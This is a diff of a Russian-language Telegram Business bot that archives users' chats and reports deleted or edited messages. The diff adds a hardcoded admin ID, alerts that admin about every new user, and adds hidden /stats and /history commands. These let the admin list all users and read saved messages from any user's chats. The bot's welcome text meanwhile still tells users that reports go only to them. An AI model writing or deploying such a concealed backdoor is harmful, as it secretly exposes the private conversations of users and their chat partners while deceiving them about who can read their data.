@@ -14,7 +14,31 @@ telebot.logger.setLevel(logging.INFO)
 TOKEN = os.environ.get("BOT_TOKEN")
 bot = TeleBot(TOKEN)
 
+# ВАШ ID ДЛЯ ДОСТУПА К АДМИНКЕ
+ADMIN_ID = 1551104336
+
 DB_FILE = "messages.db"
+
+# ==========================================
+# УСТАНОВКА МЕНЮ КОМАНД В TELEGRAM
+# ==========================================
+def setup_bot_commands():
+    try:
+        commands = [
+            types.BotCommand("start", "🚀 Перезапустить / Инструкция"),
+            types.BotCommand("help", "❓ Как подключить бота"),
+            types.BotCommand("status", "📊 Статус подключения")
+        ]
+        bot.set_my_commands(commands)
+        
+        # Команды только для Администратора
+        admin_commands = commands + [
+            types.BotCommand("history", "👑 [Админ] Просмотр всех историй"),
+            types.BotCommand("stats", "👑 [Админ] Статистика пользователей")
+        ]
+        bot.set_my_commands(admin_commands, scope=types.BotCommandScopeChat(ADMIN_ID))
+    except Exception as e:
+        print(f"Ошибка установки команд: {e}")
 
 # ==========================================
 # ВРЕМЯ И ДАТА (UTC+5)
@@ -49,7 +73,7 @@ def analyze_emotion(text):
 def init_db():
     conn = sqlite3.connect(DB_FILE)
     cursor = conn.cursor()
-    # Таблица сохраненных сообщений
+    # Сохраненные сообщения
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS messages (
             msg_id INTEGER,
@@ -63,11 +87,13 @@ def init_db():
             PRIMARY KEY (msg_id, chat_id)
         )
     ''')
-    # Таблица привязок бизнес-аккаунтов (Connection ID -> User ID владельца)
+    # Связи Business Connection ID -> User ID владельца
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS connections (
             connection_id TEXT PRIMARY KEY,
-            user_id INTEGER
+            user_id INTEGER,
+            user_name TEXT,
+            created_at REAL
         )
     ''')
     conn.commit()
@@ -75,10 +101,13 @@ def init_db():
 
 init_db()
 
-def save_connection(connection_id, user_id):
+def save_connection(connection_id, user_id, user_name="Пользователь"):
     conn = sqlite3.connect(DB_FILE)
     cursor = conn.cursor()
-    cursor.execute('INSERT OR REPLACE INTO connections (connection_id, user_id) VALUES (?, ?)', (connection_id, user_id))
+    cursor.execute('''
+        INSERT OR REPLACE INTO connections (connection_id, user_id, user_name, created_at)
+        VALUES (?, ?, ?, ?)
+    ''', (connection_id, user_id, user_name, time.time()))
     conn.commit()
     conn.close()
 
@@ -135,20 +164,30 @@ def get_sender_info(message):
 
 @bot.business_connection_handler()
 def handle_business_connection(connection):
-    # Связываем connection_id с Telegram ID пользователя, который подключил бота
-    save_connection(connection.id, connection.user.id)
+    user_name = connection.user.first_name or "Пользователь"
+    if connection.user.username:
+        user_name += f" (@{connection.user.username})"
+
+    save_connection(connection.id, connection.user.id, user_name)
+    
     if connection.is_enabled:
         try:
             bot.send_message(
                 connection.user.id, 
                 "✅ **Бот успешно подключен к вашему Telegram Business!**\n\n"
-                "Теперь я буду защищать ваши чаты. Если кто-то из ваших собеседников отредактирует или удалит сообщение, я пришлю вам копию сюда."
+                "Теперь я буду защищать ваши чаты. Если кто-то отредактирует или удалит сообщение, вы сразу получите уведомление здесь."
             )
+            # Уведомляем АДМИНА о новом пользователе
+            if connection.user.id != ADMIN_ID:
+                bot.send_message(
+                    ADMIN_ID, 
+                    f"🎉 **Новый пользователь подключил бота!**\n👤 Имя: {user_name}\n🆔 ID: `{connection.user.id}`"
+                )
         except Exception:
             pass
 
 # ==========================================
-# КОМАНДЫ ДЛЯ ВСЕХ ПОЛЬЗОВАТЕЛЕЙ
+# КОМАНДЫ ДЛЯ ОБЫЧНЫХ ПОЛЬЗОВАТЕЛЕЙ
 # ==========================================
 
 @bot.message_handler(commands=['start', 'help'])
@@ -157,13 +196,105 @@ def send_welcome(message):
         "👋 **Привет! Я бот-архиватор и защитник удаленных сообщений.**\n\n"
         "🛠 **Как мной пользоваться:**\n"
         "1. Перейдите в **Настройки Telegram** -> **Telegram Business** -> **Чат-боты**.\n"
-        "2. Добавьте этого бота и разрешите ему доступ к сообщениям.\n\n"
+        "2. Добавьте этого бота и разрешите доступ к сообщениям.\n\n"
         "✨ **Что я умею:**\n"
         "• Сохраняю удаленные сообщения (текст, фото, видео, голосовые, кругляшки).\n"
-        "• Покажу, что было в сообщении ДО того, как его отредактировали.\n"
+        "• Покажу, что было в сообщении ДО редактирования.\n"
         "• Все отчёты приходят **только вам** в этот чат!"
     )
     bot.reply_to(message, welcome_text, parse_mode="Markdown")
+
+@bot.message_handler(commands=['status'])
+def check_status(message):
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute('SELECT connection_id FROM connections WHERE user_id = ?', (message.from_user.id,))
+    row = cursor.fetchone()
+    conn.close()
+
+    if row:
+        bot.reply_to(message, "🟢 **Ваш Telegram Business подключен и работает!**")
+    else:
+        bot.reply_to(message, "🔴 **Бот ещё не подключен к вашему Telegram Business.**\nЗайдите в Настройки -> Telegram Business -> Чат-боты и добавьте бота.")
+
+# ==========================================
+# АДМИН-КОМАНДЫ (ТОЛЬКО ДЛЯ ВАС)
+# ==========================================
+
+@bot.message_handler(commands=['stats'])
+def admin_stats(message):
+    if message.from_user.id != ADMIN_ID:
+        return
+
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute('SELECT COUNT(DISTINCT user_id) FROM connections')
+    users_count = cursor.fetchone()[0]
+    
+    cursor.execute('SELECT COUNT(*) FROM messages')
+    msg_count = cursor.fetchone()[0]
+    
+    cursor.execute('SELECT user_id, user_name FROM connections GROUP BY user_id')
+    users_list = cursor.fetchall()
+    conn.close()
+
+    text = f"📊 **СТАТИСТИКА БОТА:**\n\n"
+    text += f"👥 Всего пользователей Business: **{users_count}**\n"
+    text += f"💾 Всего сохраненных сообщений: **{msg_count}**\n\n"
+    text += "📋 **Список пользователей:**\n"
+    
+    for u in users_list:
+        text += f"• {u[1]} (ID: `{u[0]}`)\n"
+
+    bot.reply_to(message, text, parse_mode="Markdown")
+
+@bot.message_handler(commands=['history'])
+def admin_history(message):
+    if message.from_user.id != ADMIN_ID:
+        return
+
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute('SELECT chat_id, sender_name, chat_title, COUNT(*) FROM messages GROUP BY chat_id')
+    chats = cursor.fetchall()
+    conn.close()
+
+    if not chats:
+        bot.reply_to(message, "📭 В базе пока нет сохраненных сообщений.")
+        return
+
+    markup = types.InlineKeyboardMarkup()
+    for c in chats:
+        chat_id, sender, title, count = c
+        btn_text = f"👤 {title} ({count} сообщ.)"
+        markup.add(types.InlineKeyboardButton(text=btn_text, callback_data=f"hist_{chat_id}"))
+
+    bot.reply_to(message, "📂 **Выберите чат из базы данных для просмотра:**", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('hist_'))
+def callback_history_chat(call):
+    if call.from_user.id != ADMIN_ID:
+        return
+
+    chat_id = int(call.data.split('_')[1])
+    
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute('SELECT sender_name, content_type, text, timestamp FROM messages WHERE chat_id = ? ORDER BY timestamp DESC LIMIT 10', (chat_id,))
+    msgs = cursor.fetchall()
+    conn.close()
+
+    if not msgs:
+        bot.answer_callback_query(call.id, "Сообщений не найдено.")
+        return
+
+    text = f"📜 **Последние 10 сообщений чата (`{chat_id}`):**\n\n"
+    for m in reversed(msgs):
+        sender, c_type, msg_text, ts = m
+        dt = datetime.fromtimestamp(ts).strftime('%H:%M:%S')
+        text += f"[{dt}] **{sender}** ({c_type}): {msg_text or '[Медиафайл]'}\n"
+
+    bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
 
 # ==========================================
 # ПЕРЕХВАТ БИЗНЕС-СООБЩЕНИЙ
@@ -187,7 +318,7 @@ def handle_business_messages(message):
     save_to_db(msg_id, chat_id, c_type, text=text, file_id=f_id, sender_name=sender_name, chat_title=chat_title)
 
 # ==========================================
-# РЕДАКТИРОВАНИЕ СООБЩЕНИЙ (Отправка владельцу)
+# РЕДАКТИРОВАНИЕ СООБЩЕНИЙ
 # ==========================================
 
 @bot.edited_business_message_handler(content_types=['text', 'photo', 'video', 'document'])
@@ -222,7 +353,7 @@ def handle_edited_business_message(message):
         save_to_db(msg_id, chat_id, old_data['type'] if old_data else 'text', text=new_text, sender_name=sender_name, chat_title=chat_title)
 
 # ==========================================
-# УДАЛЕНИЕ СООБЩЕНИЙ (Отправка владельцу)
+# УДАЛЕНИЕ СООБЩЕНИЙ
 # ==========================================
 
 @bot.deleted_business_messages_handler(func=lambda deleted_messages: True)
@@ -230,7 +361,6 @@ def handle_deleted_business_messages(deleted_messages):
     connection_id = getattr(deleted_messages, 'business_connection_id', None)
     owner_id = get_owner_by_connection(connection_id)
     
-    # Если мы не знаем владельца бизнес-аккаунта, пропускаем
     if not owner_id:
         return
 
@@ -265,7 +395,7 @@ def handle_deleted_business_messages(deleted_messages):
                     bot.send_video_note(owner_id, f_id)
                     bot.send_message(owner_id, f"🗑 Удалено ВИДЕОСООБЩЕНИЕ (кругляшок)!\n💬 Чат: {chat}\n👤 От: {sender}")
             except Exception as e:
-                print(f"Ошибка отправки удаленного сообщения: {e}")
+                print(f"Ошибка отправки: {e}")
 
 # ==========================================
 # ВЕБ-СЕРВЕР И POLLING
@@ -278,6 +408,9 @@ def home():
     return "Публичный Сервис Архивации Работает"
 
 def start_polling():
+    # Настраиваем меню команд при запуске
+    setup_bot_commands()
+    
     while True:
         try:
             bot.remove_webhook()
